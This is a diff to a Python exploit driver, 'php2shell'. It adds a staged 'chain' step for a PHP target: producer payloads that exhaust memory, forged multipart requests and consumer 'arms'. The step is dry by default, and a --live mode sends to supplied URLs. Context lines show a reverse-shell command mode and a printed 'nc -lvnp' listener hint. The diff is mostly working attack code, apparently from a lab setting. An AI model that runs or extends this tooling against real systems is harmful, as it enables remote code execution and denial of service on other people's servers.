@@ -19,6 +19,7 @@ HERE = Path(__file__).resolve().parent
 sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports
 
 from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
+from tool.modules import chain_stage as chain_stage_module  # noqa: E402
 from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
 from tool.modules import producer_modphp as modphp_producer_stage  # noqa: E402
 from tool.modules import producer_unser as unser_producer_stage  # noqa: E402
@@ -160,6 +161,53 @@ def run_write_stage_step(
     summary = write_stage_module.dry(
         main_chunk, ordinal, payload, BINARY_PROFILES[profile_name], output)
     summary["step"] = "write_stage"
+    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+    (output / "result.json").write_text(rendered)
+    return summary, output / "result.json"
+
+
+def run_chain_step(
+    target_name: str,
+    host_header: str,
+    path: str,
+    producer: str | None,
+    memory_limit: str | None,
+    body_bytes: int | None,
+    sid: str,
+    unser_url: str | None,
+    arm_url: str | None,
+    live: bool,
+    timeout: float,
+    output: Path,
+) -> tuple[dict, Path]:
+    """Modphp chain sequence: producer plus benign consumer arms.
+
+    Dry is the default and opens no socket. Live is explicit and needs both
+    --unser-url and --arm-url (checked in main()).
+    """
+    producer_name = profiles.resolve_producer(target_name, producer or "unser")
+    if producer_name not in ("producer_unser", "producer_modphp"):
+        raise ValueError(
+            f"chain producer {producer_name} is not wired: use producer_unser "
+            "(default) or producer_modphp"
+        )
+    if body_bytes is None:
+        body_bytes = modphp_producer_stage.DEFAULT_BODY_BYTES
+    knob = memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
+        "memory_limit_knob")
+    if knob is None:
+        raise ValueError("chain needs --memory-limit (no target memory_limit knob)")
+    if live:
+        summary = chain_stage_module.live(
+            producer_name, knob, body_bytes, sid, unser_url, arm_url, output,
+            timeout=timeout)
+    else:
+        unser_path = parse_url(unser_url)[2] if unser_url else None
+        arm_path = parse_url(arm_url)[2] if arm_url else None
+        summary = chain_stage_module.build(
+            host_header, path, producer_name, knob, body_bytes, sid,
+            unser_path=unser_path, arm_path=arm_path, output=output)
+    summary["step"] = "chain"
     rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
     (output / "result.json").write_text(rendered)
     return summary, output / "result.json"
@@ -504,8 +552,9 @@ def main() -> int:
         description="php2shell chain driver: --step recon (read-only receipt), "
         "--step producer (fpmwiki/modphp/unser producer modules: offline "
         "byte-build default, --live to fire), --step write_stage (dry skeleton: "
-        "final forged multipart bytes, no send), or --step chain (blocker-hold + "
-        "rearm + forged staged multipart)"
+        "final forged multipart bytes, no send), or --step chain (modphp: ordered "
+        "producer plus consumer sequence, dry default; fpm targets: legacy "
+        "blocker-hold + rearm + forged staged multipart)"
     )
     parser.add_argument(
         "--target",
@@ -537,22 +586,30 @@ def main() -> int:
     parser.add_argument(
         "--body-bytes",
         type=int,
-        default=producer_stage.DEFAULT_BODY_BYTES,
+        default=None,
         help="producer: wpTextbox1 'A'*N size, int N (5.7M anonymous-edit OOM "
-        "receipt; ladder 5.7M-6.0M fatal, 9M past the post_max_size ceiling)",
+        "receipt; ladder 5.7M-6.0M fatal, 9M past the post_max_size ceiling); "
+        "default: the producer module default (fpmwiki 5700000, modphp 262144)",
     )
     parser.add_argument(
         "--producer",
         default=None,
-        help="producer module override for --step producer (producer_unser, "
-        "producer_modphp, producer_fpmwiki; bare names accepted); default: the "
-        "target producer_stage (producer_modphp stays first on modphp)",
+        help="producer module override for --step producer or --step chain "
+        "(producer_unser, producer_modphp, producer_fpmwiki; bare names "
+        "accepted); producer default: the target producer_stage (producer_modphp "
+        "stays first on modphp); chain default: producer_unser",
     )
     parser.add_argument(
         "--unser-url",
         default=None,
-        help="producer (producer_unser) --live endpoint URL; no endpoint path is "
-        "assumed by the module",
+        help="producer_unser --live endpoint URL or chain --live producer URL; "
+        "no endpoint path is assumed by the module",
+    )
+    parser.add_argument(
+        "--arm-url",
+        default=None,
+        help="chain --live consumer arms URL (the endpoint that serves the tiny "
+        "multipart and the GET readers)",
     )
     live_group = parser.add_mutually_exclusive_group()
     live_group.add_argument(
@@ -566,14 +623,15 @@ def main() -> int:
         "--memory-limit",
         default=None,
         help="producer memory_limit: modphp knob value (overrides the TARGETS "
-        "record; absence/128M is a pre-flight failure) or the producer_unser "
-        "class (2M / 8M / 128M; default: the target knob)",
+        "record; absence/128M is a pre-flight failure), producer_unser class "
+        "(2M / 8M / 128M; default: the target knob), or chain producer knob/class",
     )
     parser.add_argument(
         "--sid",
         default=None,
-        help="producer (modphp): dry sid override (receipt: labprobe123) or "
-        "32-hex sid for --live (Cookie: PHPSESSID transport)",
+        help="producer (modphp) / chain: 32-hex sid for Cookie PHPSESSID "
+        "transport; chain dry default 0123456789abcdef0123456789abcdef; "
+        "producer_modphp dry also accepts the receipt sid labprobe123",
     )
     parser.add_argument(
         "--main-chunk",
@@ -598,8 +656,8 @@ def main() -> int:
     )
     args = parser.parse_args()
 
-    if args.producer and args.step != "producer":
-        parser.error("--producer only applies to --step producer")
+    if args.producer and args.step not in ("producer", "chain"):
+        parser.error("--producer only applies to --step producer or --step chain")
 
     target_name = args.target
     url = args.url
@@ -619,9 +677,10 @@ def main() -> int:
         )
 
     profile_name = args.profile
-    if args.step != "producer":
-        # the producer step is a byte-build stage: no binary-profile constants
-        # are needed (modphp has an address json but no measured profile yet).
+    sequence_chain = args.step == "chain" and target_name == "modphp"
+    if args.step != "producer" and not sequence_chain:
+        # producer is a byte-build stage; the modphp chain sequence uses the
+        # address profile, not a measured BINARY_PROFILES entry.
         if profile_name is None:
             try:
                 profile_name = profiles.profile_for(target_name, url_target=(target_name is None))
@@ -644,12 +703,23 @@ def main() -> int:
         parser.error("recovery interval must be between 0 and 15 seconds")
     if not 1 <= args.lport <= 65535:
         parser.error("lport must be between 1 and 65535")
+    if sequence_chain and args.live and (
+            args.unser_url is None or args.arm_url is None):
+        parser.error("--live --step chain requires --unser-url and --arm-url")
 
     if args.step == "producer":
         try:
             producer_stage_name = profiles.resolve_producer(target_name, args.producer)
         except ValueError as error:
             parser.error(str(error))
+        if args.body_bytes is None:
+            body_bytes = (
+                modphp_producer_stage.DEFAULT_BODY_BYTES
+                if producer_stage_name == "producer_modphp"
+                else producer_stage.DEFAULT_BODY_BYTES
+            )
+        else:
+            body_bytes = args.body_bytes
         if producer_stage_name == "producer_unser":
             knob = args.memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
                 "memory_limit_knob")
@@ -664,7 +734,7 @@ def main() -> int:
                 else producer_stage
             )
             try:
-                producer_stage_module.validate_body_bytes(args.body_bytes)
+                producer_stage_module.validate_body_bytes(body_bytes)
             except (TypeError, ValueError) as error:
                 parser.error(f"--body-bytes: {error}")
 
@@ -673,12 +743,12 @@ def main() -> int:
         args.output = HERE.parent / "files" / "io" / f"{target_name or 'adhoc'}-{args.step}-{stamp}"
 
     payload = None
-    if args.step in ("chain", "write_stage"):
+    if args.step == "write_stage" or (args.step == "chain" and not sequence_chain):
         payload = command_mode(args.command, args.lhost, args.lport)
         if args.command == "revshell":
             print(f"[i] payload command: {payload}")
             print(f"[i] start the listener first, e.g.: nc -lvnp {args.lport}")
-    if args.step == "chain":
+    if args.step == "chain" and not sequence_chain:
         hold = (
             f"GET {path} HTTP/1.1\r\n"
             f"Host: {host_header}\r\n"
@@ -695,7 +765,7 @@ def main() -> int:
     elif args.step == "producer":
         try:
             summary, _receipt = run_producer_step(
-                host, port, host_header, args.body_bytes, args.output,
+                host, port, host_header, body_bytes, args.output,
                 live=args.live, timeout=args.timeout,
                 target_name=target_name, path=path,
                 memory_limit=args.memory_limit, sid=args.sid,
@@ -708,7 +778,7 @@ def main() -> int:
                 "host": host,
                 "port": port,
                 "path": path,
-                "body_bytes": args.body_bytes,
+                "body_bytes": body_bytes,
                 "error": f"{type(error).__name__}: {error}",
             }
             rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
@@ -743,6 +813,35 @@ def main() -> int:
             (args.output / "result.json").write_text(rendered)
             print(rendered, end="")
             return 2
+    elif args.step == "chain" and sequence_chain:
+        sid = args.sid or chain_stage_module.DEFAULT_SID
+        try:
+            summary, _receipt = run_chain_step(
+                target_name, host_header, path, args.producer,
+                args.memory_limit, args.body_bytes, sid, args.unser_url,
+                args.arm_url, args.live, args.timeout, args.output,
+            )
+        except (ConnectionError, OSError, TimeoutError, ValueError,
+                TypeError, NotImplementedError) as error:
+            summary = {
+                "step": "chain",
+                "target": {"url": url, "host": host, "port": port, "path": path},
+                "dry_run": not args.live,
+                "sent": False,
+                "error": f"{type(error).__name__}: {error}",
+            }
+            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+            args.output.mkdir(parents=True, exist_ok=True)
+            (args.output / "result.json").write_text(rendered)
+            print(rendered, end="")
+            return 2
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        print(rendered, end="")
+        if args.live:
+            return 0 if summary.get("success") else 2
+        over_budget = summary["steps"][0].get("details", {}).get(
+            "over_budget", False)
+        return 2 if over_budget else 0
     else:
         blockers = []
         attempts = []
